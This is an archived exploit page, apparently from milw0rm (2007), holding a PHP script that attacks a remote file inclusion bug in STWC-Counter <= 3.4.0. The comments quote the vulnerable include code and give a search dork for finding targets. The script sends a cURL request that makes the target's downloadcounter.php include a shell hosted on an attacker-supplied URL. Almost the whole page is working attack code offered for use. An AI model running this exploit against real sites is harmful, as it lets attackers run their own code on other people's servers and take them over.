<html><head><title>STWC-Counter <= 3.4.0 (downloadcounter.php) RFI Exploit</title></head><pre>&lt;?php

//File Inclusion Exploit for Version STWC-Counter &lt;= 3.4.0.0
//Found and Exploit Coded by burncycle - burncycle[(at)]hotmail[(dot)]de
//|
//Vendor: http://www.stwc-counter.de/
//Dork: www.stwc-counter.de
//|
//Bug in &quot;downloadcounter.php&quot;:
//..
//$stwc_verzeichniss = $stwc_counter_verzeichniss;
//..
//include($stwc_verzeichniss . &quot;funktionen_intern.php&quot;);
//include($stwc_verzeichniss . &quot;einstellungen.php&quot;);
//include($stwc_verzeichniss . &quot;funktionen_ausgabe.php&quot;);
//..
//include($stwc_verzeichniss . &quot;sprache/deutsch.php&quot;);
//..
//include($stwc_verzeichniss . &quot;sprache/english.php&quot;);
//..
//|
//Usage: php exploit.php [pathtoscript] [pathtoshell]
//Example: php exploit.php http://pathtoscript.com/counter/ http://pathtoshell.com/(funktionen_intern.php)(einstellungen.php)(funktionen_ausgabe.php)(sprache/deutsch.php)(sprache/english.php)
//|
//Needs the cURL extension of PHP
//Works only with register_globals = on

//Nur ausnahme Fehler anzeigen
error_reporting(1);

echo &quot;Usage: php &quot;.$_SERVER[&quot;argv&quot;][0].&quot; [pathtoscript] [pathtoshell]\r\n\r\n&quot;;
echo &quot;Example: php &quot;.$_SERVER[&quot;argv&quot;][0].&quot; http://pathtoscript.com/counter/ http://pathtoshell.com/(funktionen_intern.php)(einstellungen.php)(funktionen_ausgabe.php)(sprache/deutsch.php)(sprache/english.php)\r\n\r\n&quot;;

//Schauen ob alles angegeben wurde
if(!empty($_SERVER[&quot;argv&quot;][1]) &amp;&amp; !empty($_SERVER[&quot;argv&quot;][2]))
{

  $pathtoscript = $_SERVER[&quot;argv&quot;][1];
  $pathtoshell = $_SERVER[&quot;argv&quot;][2];

  //erzeuge ein neues cURL Handle
  $ch = curl_init();

  //setzte die URL und andere Optionen
  curl_setopt($ch, CURLOPT_URL, $pathtoscript.&quot;downloadcounter.php?stwc_counter_verzeichniss=&quot;.$pathtoshell);
  curl_setopt($ch, CURLOPT_HEADER, 0);

  //f.hre die Aktion aus
  curl_exec($ch);

  //schlie.e das Handle und gebe Systemresourcen frei
  curl_close($ch);

}

?&gt;

# milw0rm.com [2007-02-26]</pre></html>